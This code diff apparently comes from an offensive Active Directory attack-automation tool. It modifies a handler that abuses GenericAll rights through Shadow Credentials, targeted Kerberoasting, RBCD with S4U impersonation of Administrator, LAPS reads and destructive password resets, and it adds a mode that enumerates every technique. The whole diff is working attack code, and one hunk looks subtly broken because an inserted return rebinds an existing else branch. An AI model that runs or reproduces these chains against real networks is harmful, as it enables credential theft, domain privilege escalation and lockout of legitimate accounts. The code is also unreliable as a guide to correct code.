@@ -228,7 +228,14 @@ class GenericAllHandler(BaseEdgeHandler):
         strategy_errors: list[str] = []
         edge_type_lower = (edge.edge_type or "").lower()
 
+        # In `learn`/emit mode, walk EVERY strategy (don't stop at the first
+        # "success") so the operator sees all alternative techniques, each
+        # labeled.  Real runs are unaffected (_emit is False).
+        from pathstrike.engine.command_emitter import emitting, set_branch
+        _emit = emitting()
+
         # -------- Strategy 1: Certipy shadow auto -------------------------
+        set_branch("Shadow Credentials — Certipy (certipy shadow auto)")
         self.logger.debug(
             "[Strategy 1/3] Certipy shadow auto on user %s", target,
         )
@@ -237,7 +244,7 @@ class GenericAllHandler(BaseEdgeHandler):
         result = await certipy_shadow(
             "auto", target=dc, account=target, auth_args=certipy_auth_args,
         )
-        if result["success"]:
+        if result["success"] and not _emit:
             self._successful_strategy = "certipy_shadow_auto"
             parsed = result.get("parsed") or {}
             nt_hash = parsed.get("nt_hash")
@@ -299,11 +306,12 @@ class GenericAllHandler(BaseEdgeHandler):
         self.logger.warning("Certipy shadow auto failed on %s: %s", target, err)
 
         # -------- Strategy 2: bloodyAD shadow credentials -----------------
+        set_branch("Shadow Credentials — bloodyAD")
         self.logger.debug(
             "[Strategy 2/3] bloodyAD shadowCredentials on user %s", target,
         )
         result = await bloody.add_key_credential(self.config, auth_args, target)
-        if result["success"]:
+        if result["success"] and not _emit:
             self._successful_strategy = "bloodyad_shadow_creds"
             cert_path = result.get("output", "")
             new_creds.append(
@@ -330,6 +338,7 @@ class GenericAllHandler(BaseEdgeHandler):
         # therefore unavailable), we can still abuse the same write right
         # to set a fake SPN, request a TGS, and clean up.  The operator
         # must crack the TGS-REP hash offline before the chain continues.
+        set_branch("Targeted Kerberoast (set SPN → request TGS → clear SPN)")
         self.logger.debug(
             "[Strategy 3/4] Targeted Kerberoast on user %s", target,
         )
@@ -353,7 +362,7 @@ class GenericAllHandler(BaseEdgeHandler):
         if leftover_spn:
             self._kerberoast_leftover_spn = leftover_spn
             self._kerberoast_target = target
-        if kr_success:
+        if kr_success and not _emit:
             self._successful_strategy = "targeted_kerberoast"
             return True, kr_msg, kr_creds
         strategy_errors.append(f"Targeted Kerberoast: {kr_msg}")
@@ -361,6 +370,7 @@ class GenericAllHandler(BaseEdgeHandler):
 
         # -------- Strategy 4: Force password reset (gated on edge type) ---
         if edge_type_lower in self._PASSWORD_RESET_CAPABLE_EDGES:
+            set_branch("Force password reset (DESTRUCTIVE — changes the target's password)")
             self.logger.debug(
                 "[Strategy 4/4] Force password reset on %s (disruptive)", target,
             )
@@ -368,7 +378,7 @@ class GenericAllHandler(BaseEdgeHandler):
             result = await bloody.set_password(
                 self.config, auth_args, target, new_pass,
             )
-            if result["success"]:
+            if result["success"] and not _emit:
                 self._successful_strategy = "password_reset"
                 new_creds.append(
                     Credential(
@@ -383,6 +393,10 @@ class GenericAllHandler(BaseEdgeHandler):
             err = result.get("error", "unknown")
             strategy_errors.append(f"Password reset: {err}")
             self.logger.warning("Password reset failed on %s: %s", target, err)
+
+        set_branch(None)
+        if _emit:
+            return True, "[emit] enumerated all user-target strategies", new_creds
         else:
             self.logger.info(
                 "Skipping password reset on %s: edge type '%s' does not grant "
@@ -431,12 +445,16 @@ class GenericAllHandler(BaseEdgeHandler):
         new_creds: list[Credential] = []
         strategy_errors: list[str] = []
 
+        from pathstrike.engine.command_emitter import emitting, set_branch
+        _emit = emitting()
+
         # -------- Strategy 1: Shadow Credentials on the computer ----------
+        set_branch("Shadow Credentials (computer)")
         self.logger.debug(
             "[Strategy 1/4] Shadow Credentials on computer %s", target,
         )
         result = await bloody.add_shadow_credentials(self.config, auth_args, target)
-        if result["success"]:
+        if result["success"] and not _emit:
             self._successful_strategy = "shadow_creds"
             cert_path = result.get("output", "")
             new_creds.append(
@@ -453,29 +471,41 @@ class GenericAllHandler(BaseEdgeHandler):
         strategy_errors.append(f"Shadow Creds: {err}")
         self.logger.warning("Shadow Creds failed on %s: %s", target, err)
 
-        # -------- Strategy 2: RBCD -----------------------------------------
-        self.logger.debug(
-            "[Strategy 2/4] RBCD configuration on %s (trustee=%s)",
-            target, principal,
+        # -------- Strategy 2: RBCD (stage computer + complete S4U) ---------
+        set_branch("RBCD via a staged computer (add computer → set RBCD → S4U)")
+        self.logger.debug("[Strategy 2/4] RBCD via staged computer on %s", target)
+        target_fqdn = edge.target.name.split("@")[0]
+        target_short = target_fqdn.split(".")[0]
+        target_sam = target_short if target_short.endswith("$") else f"{target_short}$"
+        ok, msg, ccache = await self._rbcd_via_staged_computer(
+            rbcd_target_sam=target_sam,
+            s4u_spn=f"cifs/{target_fqdn}",
+            impersonate="Administrator",
+            domain=self._get_domain(),
+            dc_ip=self._get_dc_host(),
+            write_auth=auth_args,
         )
-        result = await bloody.set_rbcd(self.config, auth_args, target, principal)
-        if result["success"]:
-            self._successful_strategy = "rbcd"
-            return (
-                True,
-                f"RBCD configured on {target} (S4U2Proxy via {principal} → any user)",
-                [],
-            )
-        err = result.get("error", "unknown")
-        strategy_errors.append(f"RBCD: {err}")
-        self.logger.warning("RBCD failed on %s: %s", target, err)
+        if ok and not _emit:
+            # The helper stages and tears down its own computer + RBCD entry,
+            # so there is no residual AD change to roll back.
+            self._successful_strategy = "rbcd_staged"
+            if ccache:
+                new_creds.append(Credential(
+                    cred_type=CredentialType.ccache, value=ccache,
+                    username="Administrator", domain=self._get_domain(),
+                    obtained_from=f"RBCD via computer-target ACL on {target_sam}",
+                ))
+            return True, msg, new_creds
+        strategy_errors.append(f"RBCD: {msg}")
+        self.logger.warning("RBCD failed on %s: %s", target, msg)
 
         # -------- Strategy 3: LAPS Read ------------------------------------
+        set_branch("LAPS read (local Administrator password)")
         self.logger.debug("[Strategy 3/4] LAPS password read on %s", target)
         result = await bloody.read_laps(self.config, auth_args, target)
         if result["success"]:
             laps_pwd = self._extract_laps_password(result)
-            if laps_pwd:
+            if laps_pwd and not _emit:
                 self._successful_strategy = "laps"
                 new_creds.append(
                     Credential(
@@ -502,6 +532,7 @@ class GenericAllHandler(BaseEdgeHandler):
             self.logger.warning("LAPS read failed on %s: %s", target, err)
 
         # -------- Strategy 4: Force machine password reset -----------------
+        set_branch("Force machine password reset (DESTRUCTIVE — breaks the computer account)")
         self.logger.debug(
             "[Strategy 4/4] Force machine password reset on %s (disruptive)",
             target,
@@ -509,7 +540,7 @@ class GenericAllHandler(BaseEdgeHandler):
         new_pass = _generate_password()
         sam = target if target.endswith("$") else f"{target}$"
         result = await bloody.set_password(self.config, auth_args, sam, new_pass)
-        if result["success"]:
+        if result["success"] and not _emit:
             self._successful_strategy = "password_reset"
             new_creds.append(
                 Credential(
@@ -524,6 +555,10 @@ class GenericAllHandler(BaseEdgeHandler):
         err = result.get("error", "unknown")
         strategy_errors.append(f"Password Reset: {err}")
         self.logger.warning("Machine password reset failed on %s: %s", target, err)
+
+        set_branch(None)
+        if _emit:
+            return True, "[emit] enumerated all computer-target strategies", new_creds
 
         # -------- All strategies exhausted ---------------------------------
         combined = "; ".join(strategy_errors)
